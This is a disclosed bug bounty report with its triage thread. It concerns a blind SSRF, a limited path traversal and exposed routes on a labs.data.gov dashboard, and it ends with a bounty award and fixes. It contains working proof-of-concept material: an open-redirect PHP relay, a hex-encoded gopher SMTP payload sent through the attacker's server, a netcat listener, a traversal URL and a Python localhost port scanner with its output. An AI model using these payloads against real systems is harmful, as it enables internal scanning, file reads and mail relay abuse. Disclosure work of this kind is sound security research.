title: Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/ Endpoint

profile.name: TTS Bug Bounty
profile.about: The First Civilian Agency Public Bug Bounty Program

vulnerability_information:
## Summary: Due to improper routes handling multiple malicious actions are possible. Attacker is able to call Class/Function/Param1/Param2 directly from source code. this may lead to call function that should be not accessible from GUI. Any Class from https://github.com/GSA/project-open-data-dashboard/tree/master/application/controllers Can be called and any function as all of them are public. ## Description: Below we present example function call from routes. As example we present "json_status" function located at https://github.com/GSA/project-open-data-dashboard/blob/f29c98267f7d843e82bfdd0f61a8272a6225aeb6/application/controllers/Campaign.php#L1048 Following URL Allow to call "json_status" function Function definition is following: ``` public function json_status($status, $real_url = null, $component = null) ``` To call function parameters we have to call following URL: https://labs.data.gov/dashboard/Campaign/json_status/$status/$real_url/$component Example URL will call SSRF to localhost using gopher protocol: https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1/ Due to this functionality multiple actions was possible ## SSRF: 1. Prepare malicious php file on VPS **o.php ``` root@vps778339:/var/www/html# cat o.php ``` 2. Send request to "json_status" function as below described. POC --- **Request to send gopher request: ``` GET /dashboard/Campaign/json_status/%68%74%74%70%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%2f%6f%2e%70%68%70%3f%73%3d%67%6f%70%68%65%72%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%3a%32%35%2f%5f%48%45%4c%4f%25%32%30%74%65%73%74%2e%6f%72%67%25%32%35%30%64%25%32%35%30%61%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%32%30%25%32%35%30%64%25%32%35%30%61%52%43%50%54%25%32%30%54%4f%3a%6b%6f%6e%74%61%6b%74%40%64%65%65%70%73%65%63%2e%70%6c%25%32%35%30%64%25%32%35%30%61%44%41%54%41%25%32%35%30%64%25%32%35%30%61%54%65%73%74%25%32%35%30%64%25%32%35%30%61%2e HTTP/1.1 Host: labs.data.gov User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: pl,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Referer: https://labs.data.gov/ Origin: https://labs.data.gov Connection: close Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c Upgrade-Insecure-Requests: 1 DNT: 1 ``` ** Netcat from server: ``` root@vps778339:/var/www/html# root@vps778339:/var/www/html# root@vps778339:/var/www/html# root@vps778339:/var/www/html# nc -lvp 25 Listening on [0.0.0.0] (family 0, port 25) Connection from ec2-18-213-100-122.compute-1.amazonaws.com 21688 received! nginx
``` PORT 25 - open https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A25 - TIMEOUT PORT 8080 - closed https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A8080 - 157 m/s response time ## Read file from /root catalog README.md In this usage of routes functionality we will present limited Local life inclusion, we escaped desired catalog "documentation" and called README.md, this vulnerability is limited due to ".md" added to string function parameter at https://github.com/GSA/project-open-data-dashboard/blob/master/application/controllers/Docs.php#L30 POC --- read README.md from my root dir. ``` https://labs.data.gov/dashboard/Docs/index/..%2fREADME ``` Function called "Docs" param $page = ..%2fREADME This vuln is limited due to ".md" hardcoded ``` public function index($page = 'main') { $data = array(); $docs_path = ($this->config->item('docs_path')) ? $this->config->item('docs_path') : 'https://raw.githubusercontent.com/GSA/project-open-data-dashboard/master/documentation/'; $docs_path = $docs_path . $page . '.md'; $docs = @file_get_contents($docs_path); ``` ## Call other function not enabled in GUI https://labs.data.gov/dashboard/user/metadata -> SAML Metadata clicking logo allow to find new components (https://labs.data.gov/dashboard/simplesaml/module.php/core/frontpage_welcome.php) https://labs.data.gov/dashboard/user/acs -> stack traces enabled ## Impact Call not available from GUI Function that may lead to critical problems.
vulnerability_information_html:
Summary:

Due to improper routes handling multiple malicious actions are possible. Attacker is able to call Class/Function/Param1/Param2 directly from source code. this may lead to call function that should be not accessible from GUI.

Any Class from
https://github.com/GSA/project-open-data-dashboard/tree/master/application/controllers
Can be called and any function as all of them are public.

Description:

Below we present example function call from routes. As example we present "json_status" function located at
https://github.com/GSA/project-open-data-dashboard/blob/f29c98267f7d843e82bfdd0f61a8272a6225aeb6/application/controllers/Campaign.php#L1048

Following URL Allow to call "json_status" function
Function definition is following:

    public function json_status($status, $real_url = null, $component = null)

To call function parameters we have to call following URL:
https://labs.data.gov/dashboard/Campaign/json_status/$status/$real_url/$component

Example URL will call SSRF to localhost using gopher protocol:
https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1/

Due to this functionality multiple actions was possible

SSRF:

  1. Prepare malicious php file on VPS
    **o.php

    root@vps778339:/var/www/html# cat o.php
<?php
$s = $_GET["s"];
header("Location: ".$s);
?>

  2. Send request to "json_status" function as below described.

POC

**Request to send gopher request:

GET /dashboard/Campaign/json_status/%68%74%74%70%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%2f%6f%2e%70%68%70%3f%73%3d%67%6f%70%68%65%72%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%3a%32%35%2f%5f%48%45%4c%4f%25%32%30%74%65%73%74%2e%6f%72%67%25%32%35%30%64%25%32%35%30%61%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%32%30%25%32%35%30%64%25%32%35%30%61%52%43%50%54%25%32%30%54%4f%3a%6b%6f%6e%74%61%6b%74%40%64%65%65%70%73%65%63%2e%70%6c%25%32%35%30%64%25%32%35%30%61%44%41%54%41%25%32%35%30%64%25%32%35%30%61%54%65%73%74%25%32%35%30%64%25%32%35%30%61%2e HTTP/1.1

PORT 25 - open
https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A25 - TIMEOUT

PORT 8080 - closed
https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A8080 - 157 m/s response time

Read file from /root catalog README.md

In this usage of routes functionality we will present limited Local life inclusion, we escaped desired catalog "documentation" and called README.md, this vulnerability is limited due to ".md" added to string function parameter at
https://github.com/GSA/project-open-data-dashboard/blob/master/application/controllers/Docs.php#L30

POC

read README.md from my root dir.

https://labs.data.gov/dashboard/Docs/index/..%2fREADME

Function called "Docs" param $page = ..%2fREADME

This vuln is limited due to ".md" hardcoded

    public function index($page = 'main')
    {

        $data = array();

        $docs_path = ($this->config->item('docs_path')) ? $this->config->item('docs_path') : 'https://raw.githubusercontent.com/GSA/project-open-data-dashboard/master/documentation/';
        $docs_path = $docs_path . $page . '.md';
        $docs = @file_get_contents($docs_path);

Call other function not enabled in GUI

https://labs.data.gov/dashboard/user/metadata -> SAML Metadata clicking logo allow to find new components (https://labs.data.gov/dashboard/simplesaml/module.php/core/frontpage_welcome.php)
https://labs.data.gov/dashboard/user/acs -> stack traces enabled

Impact

Call not available from GUI Function that may lead to critical problems.

activities.message:
According to SSRF and gopher i made simple localhost port scanner in python that scans from 0 to 500 ports range only as example. Port range can be extended in below code and multithreading can be implemented.

exp.py file:
```
import requests 


pld = "https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A"


for i in range(500):
	try:
		response = requests.get(pld+str(i),timeout=5)		
	except:
		print "PORT: "+str(i)+" OPEN"
```


Output of usage:
```
mbp-deepsec:tmp deepsec$ python exp.py
PORT: 25 OPEN
PORT: 80 OPEN
PORT: 443 OPEN
```
activities.markdown_message:
According to SSRF and gopher i made simple localhost port scanner in python that scans from 0 to 500 ports range only as example. Port range can be extended in below code and multithreading can be implemented.

exp.py file:

import requests 


pld = "https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A"


for i in range(500):
    try:
        response = requests.get(pld+str(i),timeout=5)       
    except:
        print "PORT: "+str(i)+" OPEN"

Output of usage:

mbp-deepsec:tmp deepsec$ python exp.py
PORT: 25 OPEN
PORT: 80 OPEN
PORT: 443 OPEN

Kind regards,
@retina

activities.message:
Hello @justchillin,

Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.

Note: I've triaged the Blind SSRF. Please submit separate reports for the other endpoints, as it's hard to track multiple different findings in a single submission.

Regards,
@retina

@retina ok i will report 2 moree 
1. Low risk LFI
2. improper routes handling 

You will decide the validity etc.. sorry for mess but i reported this as one probleem. Im my opinion ssrf and LFI would not be possible if the routes configiration would be proper. Problem exists as user is able to call any component class / function / param.

additional_data.old_title: Improper routes handling - Blind SSRF / gopher enabled / limited LFI and more...

activities.markdown_message:
Thank your for your report @justchillin. I agree that this SSRF is only possible because of the routes misconfiguration. The LFI looks more like improper input validation to me, but splitting out the POC in a separate report will help us make a determination. Since you've done the work of finding specific and separate POCs, we want to make sure you have the opportunity to collect a bounty for those if they are found to be valid.

We'll let you know when we have a fix (for either the SSRF or the routes configuration) and we look forward to your other submissions.

@retina please award.

activities.message:
Hey @justchillin, we have determined that this issue is eligible for a bounty, and are issuing you a $300 bounty for this `Medium`-severity issue.

Thank you once again for your report and we look forward to working with you again in the near future.

activities.message:
Hello, 

Thanks for submitting this report. We have deployed [a fix for the route configuration](https://github.com/GSA/project-open-data-dashboard/pull/283) as well as [hardening to prevent SSRFs](https://github.com/GSA/project-open-data-dashboard/pull/282), and determined that this report is now resolved. If youre still able to reproduce this issue, please let us know and we will investigate further. 

Thanks again for reporting this to TTS!
activities.markdown_message:
Hello,

Thanks for submitting this report. We have deployed a fix for the route configuration as well as hardening to prevent SSRFs, and determined that this report is now resolved. If youre still able to reproduce this issue, please let us know and we will investigate further.

Thanks again for reporting this to TTS!
